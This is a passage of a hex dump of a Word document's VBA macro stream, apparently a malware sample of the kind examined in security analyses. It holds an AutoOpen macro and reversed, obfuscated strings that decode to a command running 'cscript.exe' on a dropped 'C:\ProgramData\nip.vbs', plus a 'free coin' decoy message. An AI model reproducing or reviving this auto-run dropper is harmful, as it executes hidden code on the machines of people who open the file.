00011850: 7355 2040 6f60 2975 a095 65e0 2874 5400  sU @o`)u..e.(tT.
00011860: 1aee 0532 fa05 1c60 0900 5400 48a2 0031  ...2...`..T.H..1
00011870: a2b5 29a0 c11e 8b22 0181 022c e210 ace5  ..)...."...,....
00011880: 2222 040a 2ba2 0019 02c6 6278 6847 51c2  ""..+.....bxhGQ.
00011890: b862 0078 8011 1a85 0232 1b88 02af 0b30  .b.x.....2.....0
000118a0: 8057 ad0b f2d1 2105 a80b 1062 0100 0000  .W....!....b....
000118b0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
000118c0: 934b 2ab5 0300 1000 0000 ffff 0000 0000  .K*.............
000118d0: 0100 0200 ffff 0000 0000 0100 0000 0100  ................
000118e0: 0000 0000 0100 0200 0100 0000 0000 0100  ................
000118f0: 0500 0500 0500 0500 0500 0500 0500 0500  ................
00011900: 0500 0500 0500 0500 0100 0900 0000 2a5c  ..............*\
00011910: 434e 6f72 6d61 6c72 5540 0200 0000 0000  CNormalrU@......
00011920: 0040 0000 0000 0000 0040 0000 0000 0000  .@.......@......
00011930: 0040 0000 0000 0000 0006 0000 0000 0000  .@..............
00011940: 7e02 0000 0000 0000 7e02 0000 0000 0000  ~.......~.......
00011950: 7e02 0000 0000 0000 7e02 0000 0000 0000  ~.......~.......
00011960: 7e02 0000 0000 0000 7e02 0000 0000 0000  ~.......~.......
00011970: 7e02 0000 0000 0000 7e02 0000 0000 0000  ~.......~.......
00011980: 7e02 0000 0000 0000 7e04 0000 0000 0000  ~.......~.......
00011990: 7e06 0000 0000 0000 7e06 0000 0000 0000  ~.......~.......
000119a0: 7e06 0000 0000 0000 7e06 0000 0000 0000  ~.......~.......
000119b0: 7e06 0000 0000 0000 7e06 0000 0000 0000  ~.......~.......
000119c0: 7e06 0000 0000 0000 7e02 0000 0000 0000  ~.......~.......
000119d0: 7e10 0000 0000 0000 7f00 0000 0000 0000  ~...............
000119e0: 0022 0000 0000 0000 0011 0000 0000 0000  ."..............
000119f0: 0000 0001 0010 0000 0000 0000 0000 0000  ................
00011a00: 0081 0100 0000 0000 0000 0000 00b1 a8b8  ................
00011a10: b402 4255 40b5 a3cb 3854 f719 f101 0009  ..BU@...8T......
00011a20: 0400 0009 0400 00e4 0400 0000 0000 0001  ................
00011a30: 00ff ffff ffff ffff ff02 0002 0a00 00ff  ................
00011a40: ffff ffff ffff ffff ffff ffff ffff ffff  ................
00011a50: ffff ffff ffff ff00 0000 0031 0100 0000  ...........1....
00011a60: 0000 0000 0000 0001 8861 0011 0000 0000  .........a......
00011a70: 0000 0000 0002 00e1 0d00 0000 0000 0000  ................
00011a80: 0000 00ff ffff ffff ffff ff70 0100 0000  ...........p....
00011a90: 0000 0000 0000 00ff ffff ffff ffff ff01  ................
00011aa0: 00b1 0d00 0000 0000 0000 0000 00ff ff00  ................
00011ab0: 0061 0100 0000 0000 0000 0000 0009 0091  .a..............
00011ac0: 0200 0000 0000 0000 0000 0000 0000 0000  ................
00011ad0: 0000 0000 0000 0000 0000 0011 0400 0000  ................
00011ae0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00011af0: 0000 0000 0000 0041 0500 0000 0000 0000  .......A........
00011b00: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00011b10: 0000 0011 0000 0000 0000 0001 0000 0068  ...............h
00011b20: dcd0 a54a 5977 449b 1fc7 e204 9d9c 1bb1  ...JYwD.........
00011b30: 0600 0000 0000 0000 0000 0000 0000 0000  ................
00011b40: 0000 0000 0000 0000 0000 0011 0800 0000  ................
00011b50: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00011b60: 0000 0000 0000 00b1 0a00 0000 0000 0000  ................
00011b70: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00011b80: 0000 0011 0c00 0000 0000 0000 0000 0000  ................
00011b90: 0000 0000 0000 0000 0000 0000 0000 0021  ...............!
00011ba0: 0d00 0000 0000 0000 0000 0000 0000 0000  ................
00011bb0: 0000 0000 0000 0000 0000 0004 0000 0000  ................
00011bc0: 0000 020c 0000 0000 0000 0054 6869 7344  ...........ThisD
00011bd0: 6f63 756d 656e 7402 0000 0000 0000 0203  ocument.........
00011be0: 0000 0000 0000 0062 7868 0200 0000 0000  .......bxh......
00011bf0: 0002 0700 0000 0000 0000 5072 6f6a 6563  ..........Projec
00011c00: 7404 0000 0000 0000 03ef 0402 0000 0000  t...............
00011c10: 00c0 0000 0000 0000 4612 0000 0000 0000  ........F.......
00011c20: 0242 0000 0000 0000 0043 3a5c 5072 6f67  .B.......C:\Prog
00011c30: 7261 6d20 4669 6c65 735c 436f 6d6d 6f6e  ram Files\Common
00011c40: 2046 696c 6573 5c4d 6963 726f 736f 6674   Files\Microsoft
00011c50: 2053 6861 7265 645c 5642 415c 5642 4137   Shared\VBA\VBA7
00011c60: 2e31 5c56 4245 372e 444c 4c02 0000 0000  .1\VBE7.DLL.....
00011c70: 0000 0203 0000 0000 0000 0056 4241 1000  ...........VBA..
00011c80: 0000 0000 000a a101 0000 0000 0000 0000  ................
00011c90: 0000 ffff ffff ffff ffff 0400 0200 0900  ................
00011ca0: 0000 d101 0000 0000 0000 0000 0000 7102  ..............q.
00011cb0: 0000 0000 0000 0000 0000 5000 0000 0000  ..........P.....
00011cc0: 0000 0000 0000 0000 0000 0000 0400 0000  ................
00011cd0: 0000 0003 0509 0200 0000 0000 c000 0000  ................
00011ce0: 0000 0046 1000 0000 0000 0002 3a00 0000  ...F........:...
00011cf0: 0000 0000 433a 5c50 726f 6772 616d 2046  ....C:\Program F
00011d00: 696c 6573 5c4d 6963 726f 736f 6674 204f  iles\Microsoft O
00011d10: 6666 6963 655c 726f 6f74 5c4f 6666 6963  ffice\root\Offic
00011d20: 6531 365c 4d53 574f 5244 2e4f 4c42 0400  e16\MSWORD.OLB..
00011d30: 0000 0000 0002 0400 0000 0000 0000 576f  ..............Wo
00011d40: 7264 1000 0000 0000 000a 2103 0000 0000  rd........!.....
00011d50: 0000 0000 0000 ffff ffff ffff ffff 0800  ................
00011d60: 0700 0000 0000 5103 0000 0000 0000 0000  ......Q.........
00011d70: 0000 e103 0000 0000 0000 0000 0000 7000  ..............p.
00011d80: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00011d90: 0400 0000 0000 0003 3004 0200 0000 0000  ........0.......
00011da0: c000 0000 0000 0046 0800 0000 0000 0002  .......F........
00011db0: 1f00 0000 0000 0000 433a 5c57 696e 646f  ........C:\Windo
00011dc0: 7773 5c53 7973 7465 6d33 325c 7374 646f  ws\System32\stdo
00011dd0: 6c65 322e 746c 6202 0000 0000 0000 0206  le2.tlb.........
00011de0: 0000 0000 0000 0073 7464 6f6c 6510 0000  .......stdole...
00011df0: 0000 0000 0aa1 0400 0000 0000 0000 0000  ................
00011e00: 00ff ffff ffff ffff ff02 0000 0000 0000  ................
00011e10: 00d1 0400 0000 0000 0000 0000 0021 0500  .............!..
00011e20: 0000 0000 0000 0000 0090 0000 0000 0000  ................
00011e30: 0000 0000 0000 0000 0000 0004 0000 0000  ................
00011e40: 0000 034c d0f8 2dfa 5b1b 10bd e500 aa00  ...L..-.[.......
00011e50: 44de 5210 0000 0000 0000 023f 0000 0000  D.R........?....
00011e60: 0000 0043 3a5c 5072 6f67 7261 6d20 4669  ...C:\Program Fi
00011e70: 6c65 735c 436f 6d6d 6f6e 2046 696c 6573  les\Common Files
00011e80: 5c4d 6963 726f 736f 6674 2053 6861 7265  \Microsoft Share
00011e90: 645c 4f46 4649 4345 3136 5c4d 534f 2e44  d\OFFICE16\MSO.D
00011ea0: 4c4c 0200 0000 0000 0002 0600 0000 0000  LL..............
00011eb0: 0000 4f66 6669 6365 1000 0000 0000 000a  ..Office........
00011ec0: d105 0000 0000 0000 0000 0000 ffff ffff  ................
00011ed0: ffff ffff 0200 0800 0000 0000 0106 0000  ................
00011ee0: 0000 0000 0000 0000 9106 0000 0000 0000  ................
00011ef0: 0000 0000 b000 0000 0000 0000 0000 0000  ................
00011f00: 0000 0000 0000 0400 0000 0000 0003 e12e  ................
00011f10: 450d 8fe0 1a10 852e 0260 8c4d 0bb4 0800  E........`.M....
00011f20: 0000 0000 0002 1c00 0000 0000 0000 433a  ..............C:
00011f30: 5c57 696e 646f 7773 5c73 7973 7465 6d33  \Windows\system3
00011f40: 325c 464d 3230 2e44 4c4c 0200 0000 0000  2\FM20.DLL......
00011f50: 0002 0700 0000 0000 0000 4d53 466f 726d  ..........MSForm
00011f60: 7304 0000 0000 0000 036b 0902 0000 0000  s........k......
00011f70: 00c0 0000 0000 0000 4610 0000 0000 0000  ........F.......
00011f80: 0a41 0700 0000 0000 0000 0000 0041 0700  .A...........A..
00011f90: 0000 0000 0000 0000 0002 0000 0000 0000  ................
00011fa0: 0071 0700 0000 0000 0000 0000 00c1 0700  .q..............
00011fb0: 0000 0000 0000 0000 00d0 0000 0000 0000  ................
00011fc0: 0000 0000 0001 0000 0001 0004 0000 0000  ................
00011fd0: 0000 0381 eb9b 6a23 b180 41ae 64db d565  ......j#..A.d..e
00011fe0: 5b5b 9c0e 0000 0000 0000 0230 0000 0000  [[.........0....
00011ff0: 0000 0043 3a5c 5573 6572 735c 3078 6466  ...C:\Users\0xdf
00012000: 5c41 7070 4461 7461 5c4c 6f63 616c 5c54  \AppData\Local\T
00012010: 656d 705c 5642 455c 4d53 466f 726d 732e  emp\VBE\MSForms.
00012020: 6578 6410 0000 0000 0000 0aa1 0800 0000  exd.............
00012030: 0000 0000 0000 0041 0700 0000 0000 0000  .......A........
00012040: 0000 0002 0000 0000 0000 00d1 0800 0000  ................
00012050: 0000 0000 0000 00c1 0700 0000 0000 0000  ................
00012060: 0000 00f0 0000 0000 0000 0000 0000 0001  ................
00012070: 0000 0002 0004 0000 0000 0000 036c 1975  .............l.u
00012080: 2aeb d929 41b8 0393 1327 f72d 5c0e 0000  *..)A....'.-\...
00012090: 0000 0000 0234 0000 0000 0000 0043 3a5c  .....4.......C:\
000120a0: 5072 6f67 7261 6d20 4669 6c65 735c 436f  Program Files\Co
000120b0: 6d6d 6f6e 2046 696c 6573 5c53 7973 7465  mmon Files\Syste
000120c0: 6d5c 6164 6f5c 6d73 6164 6f32 382e 746c  m\ado\msado28.tl
000120d0: 6202 0000 0000 0000 0205 0000 0000 0000  b...............
000120e0: 0041 444f 4442 1000 0000 0000 000a e109  .ADODB..........
000120f0: 0000 0000 0000 0000 0000 ffff ffff ffff  ................
00012100: ffff 0200 0800 0000 0000 110a 0000 0000  ................
00012110: 0000 0000 0000 910a 0000 0000 0000 0000  ................
00012120: 0000 1001 0000 0000 0000 0000 0000 0000  ................
00012130: 0000 0000 0400 0000 0000 0003 3028 0b42  ............0(.B
00012140: 18e7 cf11 893d 00a0 c905 4228 0800 0000  .....=....B(....
00012150: 0000 0002 1e00 0000 0000 0000 433a 5c57  ............C:\W
00012160: 696e 646f 7773 5c53 7973 7465 6d33 325c  indows\System32\
00012170: 7363 7272 756e 2e64 6c6c 0400 0000 0000  scrrun.dll......
00012180: 0002 0900 0000 0000 0000 5363 7269 7074  ..........Script
00012190: 696e 6702 0000 0000 0000 0206 0000 0000  ing.............
000121a0: 0000 0057 4d50 4c69 6210 0000 0000 0000  ...WMPLib.......
000121b0: 0a41 0b00 0000 0000 0000 0000 00ff ffff  .A..............
000121c0: ffff ffff ff01 0000 0000 0000 0071 0b00  .............q..
000121d0: 0000 0000 0000 0000 00c1 0b00 0000 0000  ................
000121e0: 0000 0000 0030 0100 0000 0000 0000 0000  .....0..........
000121f0: 0000 0000 0000 0004 0000 0000 0000 0350  ...............P
00012200: 2af5 6b4a 39d3 11b1 5300 c04f 79fa a608  *.kJ9...S..Oy...
00012210: 0000 0000 0000 021b 0000 0000 0000 0043  ...............C
00012220: 3a5c 5769 6e64 6f77 735c 7379 7374 656d  :\Windows\system
00012230: 3332 5c77 6d70 2e64 6c6c 1000 0000 0000  32\wmp.dll......
00012240: 000a a10c 0000 0000 0000 0000 0000 ffff  ................
00012250: ffff ffff ffff 0100 0000 0000 0000 d10c  ................
00012260: 0000 0000 0000 0000 0000 f10b 0000 0000  ................
00012270: 0000 0000 0000 5001 0000 0000 0000 0000  ......P.........
00012280: 0000 0000 0000 0000 0400 0000 0000 0002  ................
00012290: 0800 0000 0000 0000 4175 746f 4f70 656e  ........AutoOpen
000122a0: 0600 0000 0000 000d 1400 1400 0000 1000  ................
000122b0: 0000 0000 0000 0000 0000 0000 0000 0400  ................
000122c0: 0000 0000 0003 f009 0200 0000 0000 c000  ................
000122d0: 0000 0000 0046 0400 0000 0000 0003 b909  .....F..........
000122e0: 0200 0000 0000 c000 0000 0000 0046 0800  .............F..
000122f0: 0000 0000 0005 0200 210e 0000 0000 0000  ........!.......
00012300: 0000 0000 510e 0000 0000 0000 0000 0000  ....Q...........
00012310: ffff ffff ffff ffff 2600 0000 0000 000e  ........&.......
00012320: 0302 6d00 0208 0851 0e00 0000 0000 0000  ..m....Q........
00012330: 0000 0026 0000 0000 0000 0e03 026d 0002  ...&.........m..
00012340: 0808 e107 0000 0000 0000 0000 0000 0400  ................
00012350: 0000 0000 0003 9f09 0200 0000 0000 c000  ................
00012360: 0000 0000 0046 2600 0000 0000 000e 0303  .....F&.........
00012370: 7400 0208 0808 5111 0000 0000 0000 0000  t.....Q.........
00012380: 0000 0a00 0000 0000 000b 1e00 0000 5c00  ..............\.
00012390: 6100 7400 6100 4400 6d00 6100 7200 6700  a.t.a.D.m.a.r.g.
000123a0: 6f00 7200 5000 5c00 3a00 4300 0400 0000  o.r.P.\.:.C.....
000123b0: 0000 0002 0800 0000 0000 0000 5642 4537  ............VBE7
000123c0: 2e44 4c4c 0e00 0000 0000 0007 2113 0000  .DLL........!...
000123d0: 0000 0000 0000 0000 ffff ffff ffff ffff  ................
000123e0: c902 0b00 1114 0000 0000 0000 0000 0000  ................
000123f0: a001 0000 0000 0000 0000 0000 0600 0000  ................
00012400: 0000 007f 1e00 0000 0000 000e 0201 5a00  ..............Z.
00012410: 0707 0600 0000 0000 000b 0e00 0000 7300  ..............s.
00012420: 6200 7600 2e00 6e00 6900 7000 0200 0000  b.v...n.i.p.....
00012430: 0000 000b 0000 0000 0800 0000 0000 000b  ................
00012440: 1400 0000 4900 5a00 4f00 4900 5a00 4900  ....I.Z.O.I.Z.I.
00012450: 4d00 4900 5a00 4900 0800 0000 0000 0001  M.I.Z.I.........
00012460: 1e00 0000 0000 0000 4100 6c00 7400 6500  ........A.l.t.e.
00012470: 7200 6e00 6100 7400 6900 7600 6500 5400  r.n.a.t.i.v.e.T.
00012480: 6500 7800 7400 0e00 0000 0000 0007 2113  e.x.t.........!.
00012490: 0000 0000 0000 0000 0000 ffff ffff ffff  ................
000124a0: ffff 8802 0b00 9116 0000 0000 0000 0000  ................
000124b0: 0000 e001 0000 0000 0000 0000 0000 1e00  ................
000124c0: 0000 0000 000e 0201 5a00 0108 0400 0000  ........Z.......
000124d0: 0000 000c 0400 0000 0000 0000 0100 8c00  ................
000124e0: 0800 0000 0000 007f 1600 0000 0000 000b  ................
000124f0: 5200 0000 7300 6200 7600 2e00 6e00 6900  R...s.b.v...n.i.
00012500: 7000 5c00 6100 7400 6100 4400 6d00 6100  p.\.a.t.a.D.m.a.
00012510: 7200 6700 6f00 7200 5000 5c00 3a00 4300  r.g.o.r.P.\.:.C.
00012520: 2000 6500 7800 6500 2e00 7400 7000 6900   .e.x.e...t.p.i.
00012530: 7200 6300 7300 6300 2000 6b00 2f00 2000  r.c.s.c. .k./. .
00012540: 6400 6d00 6300 0e00 0000 0000 0007 2113  d.m.c.........!.
00012550: 0000 0000 0000 0000 0000 ffff ffff ffff  ................
00012560: ffff 6002 0b00 5119 0000 0000 0000 0000  ..`...Q.........
00012570: 0000 2002 0000 0000 0000 0000 0000 2000  .. ........... .
00012580: 0000 0000 000e 0202 6100 1408 020e 0000  ........a.......
00012590: 0000 0000 0721 1300 0000 0000 0000 0000  .....!..........
000125a0: 00ff ffff ffff ffff ff58 020b 00e1 1a00  .........X......
000125b0: 0000 0000 0000 0000 0060 0200 0000 0000  .........`......
000125c0: 0000 0000 0020 0000 0000 0000 0e02 0261  ..... .........a
000125d0: 0004 0802 0200 0000 0000 007f 0e00 0000  ................
000125e0: 0000 0007 2113 0000 0000 0000 0000 0000  ....!...........
000125f0: ffff ffff ffff ffff 2202 0b00 911c 0000  ........".......
00012600: 0000 0000 0000 0000 a002 0000 0000 0000  ................
00012610: 0000 0000 1e00 0000 0000 000e 0201 5a00  ..............Z.
00012620: 1408 0600 0000 0000 000b 1000 0000 3000  ..............0.
00012630: 3000 3a00 3000 3000 3a00 3000 3500 0e00  0.:.0.0.:.0.5...
00012640: 0000 0000 0007 2113 0000 0000 0000 0000  ......!.........
00012650: 0000 ffff ffff ffff ffff 1d02 0b00 511e  ..............Q.
00012660: 0000 0000 0000 0000 0000 e002 0000 0000  ................
00012670: 0000 0000 0000 2000 0000 0000 000e 0202  ...... .........
00012680: 6100 1408 0714 0000 0000 0000 7f1a 0000  a...............
00012690: 0000 0000 0b62 0000 0055 006e 0066 006f  .....b...U.n.f.o
000126a0: 0072 0074 0075 006e 0061 0074 0065 006c  .r.t.u.n.a.t.e.l
000126b0: 0079 0020 0079 006f 0075 0020 0061 0072  .y. .y.o.u. .a.r
000126c0: 0065 0020 006e 006f 0074 0020 0065 006c  .e. .n.o.t. .e.l
000126d0: 0069 0067 0061 0062 006c 0065 0020 0066  .i.g.a.b.l.e. .f
000126e0: 006f 0072 0020 0066 0072 0065 0065 0020  .o.r. .f.r.e.e. 
000126f0: 0063 006f 0069 006e 0021 000e 0000 0000  .c.o.i.n.!......
00012700: 0000 0721 1300 0000 0000 0000 0000 00ff  ...!............
00012710: ffff ffff ffff ff53 020b 0071 2100 0000  .......S...q!...
00012720: 0000 0000 0000 0020 0300 0000 0000 0000  ....... ........
00012730: 0000 0028 0000 0000 0000 0e02 057e 0002  ...(.........~..
00012740: 0802 0808 0804 0000 0000 0000 0621 0e00  .............!..
00012750: 0000 0000 0000 0000 0060 0300 0000 0000  .........`......
00012760: 0000 0000 0022 0000 0000 0000 7f00 0000  ....."..........
00012770: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00012780: 7255 4000 0000 0000 0000 0000 0000 0000  rU@.............
00012790: 0000 4000 0000 0000 0000 4000 0000 0000  ..@.......@.....
000127a0: 0000 0000 0000 0000 0000 1200 0000 0000  ................
000127b0: 0000 1100 0000 0000 0000 0000 0000 ffff  ................
000127c0: ffff ffff ffff ffff ffff ffff ffff ffff  ................
000127d0: ffff 0000 0000 ffff ffff ffff ffff 1100  ................
000127e0: 0000 0000 0000 0000 0300 6a00 0000 0000  ..........j.....
000127f0: 007f 0000 0000 0000 0000 0000 0000 0000  ................
00012800: 8100 0000 8200 0000 8300 0000 8400 0000  ................
00012810: 8500 0000 8600 0000 8700 0000 8800 0000  ................
00012820: 8900 0000 8a00 0000 8b00 0000 8c00 0000  ................
00012830: 8d00 0000 8e00 0000 8f00 0000 9000 0000  ................
00012840: 9100 0000 9200 0000 9300 0000 9400 0000  ................
00012850: 9500 0000 9600 0000 feff ffff 9800 0000  ................
00012860: 9900 0000 feff ffff 9b00 0000 9c00 0000  ................
00012870: 9d00 0000 9e00 0000 9f00 0000 a000 0000  ................
00012880: a100 0000 a200 0000 a300 0000 a400 0000  ................
00012890: a500 0000 a600 0000 a700 0000 a800 0000  ................
000128a0: a900 0000 feff ffff ab00 0000 ac00 0000  ................
000128b0: ad00 0000 ae00 0000 af00 0000 b000 0000  ................
000128c0: b100 0000 feff ffff feff ffff b400 0000  ................
000128d0: feff ffff ffff ffff ffff ffff ffff ffff  ................
000128e0: ffff ffff ffff ffff ffff ffff ffff ffff  ................
000128f0: ffff ffff ffff ffff ffff ffff ffff ffff  ................
00012900: ffff ffff ffff ffff ffff ffff ffff ffff  ................
00012910: ffff ffff ffff ffff ffff ffff ffff ffff  ................
00012920: ffff ffff ffff ffff ffff ffff ffff ffff  ................
00012930: ffff ffff ffff ffff ffff ffff ffff ffff  ................
00012940: ffff ffff ffff ffff ffff ffff ffff ffff  ................
00012950: ffff ffff ffff ffff ffff ffff ffff ffff  ................
00012960: ffff ffff ffff ffff ffff ffff ffff ffff  ................
00012970: ffff ffff ffff ffff ffff ffff ffff ffff  ................
00012980: ffff ffff ffff ffff ffff ffff ffff ffff  ................
00012990: ffff ffff ffff ffff ffff ffff ffff ffff  ................
000129a0: ffff ffff ffff ffff ffff ffff ffff ffff  ................
000129b0: ffff ffff ffff ffff ffff ffff ffff ffff  ................
000129c0: ffff ffff ffff ffff ffff ffff ffff ffff  ................
000129d0: ffff ffff ffff ffff ffff ffff ffff ffff  ................
000129e0: ffff ffff ffff ffff ffff ffff ffff ffff  ................
000129f0: ffff ffff ffff ffff ffff ffff ffff ffff  ................
00012a00: 7255 4000 0000 0000 0000 4000 0000 0000  rU@.......@.....
00012a10: 0000 4000 0000 0000 0000 4000 0000 0000  ..@.......@.....
00012a20: 0000 0400 0000 0000 007e 7800 0000 0000  .........~x.....
00012a30: 007f 0000 0000 0000 0000 1a00 0000 0000  ................
00012a40: 0000 1100 0000 0000 0000 0000 0000 1100  ................
00012a50: 0000 0000 0000 0000 0300 1000 0000 0000  ................
00012a60: 0000 0000 0200 0100 0100 1500 0000 d10e  ................
00012a70: 0000 0000 0000 0000 0000 1110 0000 0000  ................
00012a80: 0000 0000 0000 8111 0000 0000 0000 0000  ................
00012a90: 0000 5113 0000 0000 0000 0000 0000 1116  ..Q.............
00012aa0: 0000 0000 0000 0000 0000 d118 0000 0000  ................
00012ab0: 0000 0000 0000 611a 0000 0000 0000 0000  ......a.........
00012ac0: 0000 111c 0000 0000 0000 0000 0000 d11d  ................
00012ad0: 0000 0000 0000 0000 0000 f120 0000 0000  ........... ....
00012ae0: 0000 0000 0000 c122 0000 0000 0000 0000  ......."........
00012af0: 0000 810e 0000 0000 0000 0000 0000 c112  ................
00012b00: 0000 0000 0000 0000 0000 1115 0000 0000  ................
00012b10: 0000 0000 0000 5115 0000 0000 0000 0000  ......Q.........
00012b20: 0000 7115 0000 0000 0000 0000 0000 c115  ..q.............
00012b30: 0000 0000 0000 0000 0000 9117 0000 0000  ................
00012b40: 0000 0000 0000 1118 0000 0000 0000 0000  ................
00012b50: 0000 911d 0000 0000 0000 0000 0000 1120  ............... 
00012b60: 0000 0000 0000 0000 0000 f403 0000 0000  ................
00012b70: 0000 3c03 0000 0000 0000 6702 0600 0000  ..<.......g.....
00012b80: 6702 6400 0000 9f02 b0ff ffff f805 b8ff  g.d.............
00012b90: ffff 0100 9f02 e8ff ffff 9f02 f0ff ffff  ................
00012ba0: df03 0a00 5a04 0b00 f401 6800 0000 9e02  ....Z.....h.....
00012bb0: f0ff ffff f401 8802 0100 9e02 e8ff ffff  ................
00012bc0: f401 6000 0200 6503 b0ff ffff c202 f8ff  ..`...e.........
00012bd0: ffff ec05 0400 f0ff ffff e8ff ffff bc03  ................
00012be0: b8ff ffff 6702 6400 0000 9f02 b0ff ffff  ....g.d.........
00012bf0: f805 b8ff ffff 0200 9f02 e8ff ffff 9f02  ................
00012c00: f0ff ffff df03 0a00 5a04 0b00 f401 6800  ........Z.....h.
00012c10: 0000 9e02 f0ff ffff f401 8802 0100 9e02  ................
00012c20: e8ff ffff f401 6000 0200 6503 b0ff ffff  ......`...e.....
00012c30: c202 a8ff ffff ec05 0400 f0ff ffff e8ff  ................
00012c40: ffff bc03 b8ff ffff 6702 1c00 0000 f705  ........g.......
00012c50: 0c00 f704 0300 0800 7103 b8ff ffff b602  ........q.......
00012c60: 90ff ffff 6702 2e00 0000 9602 90ff ffff  ....g...........
00012c70: f705 0d00 f704 0300 0800 7103 b8ff ffff  ..........q.....
00012c80: c800 78ff ffff b602 60ff ffff bc03 b8ff  ..x.....`.......
00012c90: ffff 6702 1c00 0000 f705 0e00 f704 0300  ..g.............
00012ca0: 0800 7103 b8ff ffff b602 48ff ffff 6702  ..q.......H...g.
00012cb0: 1c00 0000 f705 0f00 f704 0300 0800 7103  ..............q.
00012cc0: b8ff ffff b602 30ff ffff 6702 3a00 0000  ......0...g.:...
00012cd0: 9e02 f8ff ffff d105 b8ff ffff 1000 9e02  ................
00012ce0: a8ff ffff d105 78ff ffff 1000 c800 18ff  ......x.........
00012cf0: ffff b602 00ff ffff ea05 0400 b8ff ffff  ................
00012d00: 78ff ffff 6702 2400 0000 f101 b8ff ffff  x...g.$.........
00012d10: f104 0400 0800 6b03 d0fe ffff b602 e8fe  ......k.........
00012d20: ffff bc03 b8ff ffff 6702 2a00 0000 9602  ........g.*.....
00012d30: 60ff ffff 6601 6703 c8fe ffff 9602 e8fe  `...f.g.........
00012d40: ffff 8a01 ed05 ffff 8005 0200 bd03 c8fe  ................
00012d50: ffff 6702 1a00 0000 9602 00ff ffff 9602  ..g.............
00012d60: e8fe ffff 8a01 5f06 1100 1000 6702 1000  ......_.....g...
00012d70: 0000 9602 e8fe ffff 8a01 2003 6702 6000  .......... .g.`.
00012d80: 0000 f705 1200 f704 0300 0800 b702 c8fe  ................
00012d90: ffff f005 3000 0000 9f02 b8ff ffff ff04  ....0...........
00012da0: 0500 1000 9602 b8ff ffff 9601 2203 c8fe  ............"...
00012db0: ffff 7103 78ff ffff fd04 0600 1000 6e03  ..q.x.........n.
00012dc0: d0ff ffff b602 b0fe ffff bd03 c8fe ffff  ................
00012dd0: ea05 0400 78ff ffff b8ff ffff 6702 4600  ....x.......g.F.
00012de0: 0000 9f02 b8ff ffff ff04 0700 0800 9602  ................
00012df0: b8ff ffff f705 1300 9f02 78ff ffff ff04  ..........x.....
00012e00: 0800 1000 9602 78ff ffff c800 18ff ffff  ......x.........
00012e10: b602 98fe ffff ea05 0400 b8ff ffff 78ff  ..............x.
00012e20: ffff 6702 2c00 0000 9f02 b8ff ffff ff04  ..g.,...........
00012e30: 0700 0800 9602 b8ff ffff 9602 98fe ffff  ................
00012e40: 8f00 bc03 b8ff ffff c702 e002 0000 6702  ..............g.
00012e50: 0c00 0000 c602 a802 0000 6702 4c00 0000  ..........g.L...
00012e60: f101 50fe ffff f101 18ff ffff f101 78ff  ..P...........x.
00012e70: ffff f005 0000 0000 fe05 d0ff ffff 1400  ................
00012e80: 4906 b8ff ffff 9f02 b8ff ffff ff04 0900  I...............
00012e90: 2800 ea05 0800 b8ff ffff 78ff ffff 18ff  (.........x.....
00012ea0: ffff 50fe ffff 6702 0800 0000 6b02 6702  ..P...g.....k.g.
00012eb0: 0000 0000 7b02 0000 0000 0000 0000 0800  ....{...........
00012ec0: b001 3c03 0000 7400 0000 0800 0000 0000  ..<...t.........
00012ed0: 0000 0000 0000 0000 0000 5000 0000 0000  ..........P.....
00012ee0: 0000 0000 0a00 0000 0000 0000 0000 30ff  ..............0.
00012ef0: ffff 0200 e8fe ffff 0200 b0fe ffff 0200  ................
00012f00: f8ff ffff 0300 a8ff ffff 0300 98fe ffff  ................
00012f10: 0200 00ff ffff 0200 48ff ffff 0200 60ff  ........H.....`.
00012f20: ffff 0200 90ff ffff 0200 4400 0000 0000  ..........D.....
00012f30: 0000 0000 0800 0000 0000 0000 0000 c8fe  ................
00012f40: ffff 0100 f0ff ffff 0300 e8ff ffff 0300  ................
00012f50: b0ff ffff 0300 b8ff ffff 0200 78ff ffff  ............x...
00012f60: 0200 18ff ffff 0200 50fe ffff 0200 0c00  ........P.......
00012f70: 0000 0000 0012 0000 6101 0000 0000 0000  ........a.......
00012f80: 0000 0200 1e00 0000 0000 000e 0000 5300  ..............S.
00012f90: 1434 0000 0000 0000 7f00 0000 0000 0000  .4..............
00012fa0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00012fb0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00012fc0: 7255 4000 0000 0000 0000 0000 0000 0000  rU@.............
00012fd0: 0000 4000 0000 0000 0000 4000 0000 0000  ..@.......@.....
00012fe0: 0000 0000 0000 0000 0000 1a00 0000 0000  ................
00012ff0: 0000 1100 0000 0000 0000 0000 0200 ffff  ................
00013000: 5f00 5f00 5300 5200 5000 5f00 3300 0000  _._.S.R.P._.3...
00013010: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00013020: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00013030: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00013040: 1000 0200 0b00 0000 0d00 0000 ffff ffff  ................
00013050: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00013060: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00013070: 0000 0000 9700 0000 9c00 0000 0000 0000  ................
00013080: 5400 6800 6900 7300 4400 6f00 6300 7500  T.h.i.s.D.o.c.u.
00013090: 6d00 6500 6e00 7400 0000 0000 0000 0000  m.e.n.t.........
000130a0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
000130b0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
000130c0: 1a00 0201 ffff ffff 0e00 0000 ffff ffff  ................
000130d0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
000130e0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
000130f0: 0000 0000 9a00 0000 c803 0000 0000 0000  ................
00013100: 5f00 5600 4200 4100 5f00 5000 5200 4f00  _.V.B.A._.P.R.O.
00013110: 4a00 4500 4300 5400 0000 0000 0000 0000  J.E.C.T.........
00013120: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00013130: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00013140: 1a00 0200 ffff ffff ffff ffff ffff ffff  ................
00013150: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00013160: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00013170: 0000 0000 9b00 0000 cc10 0000 0000 0000  ................
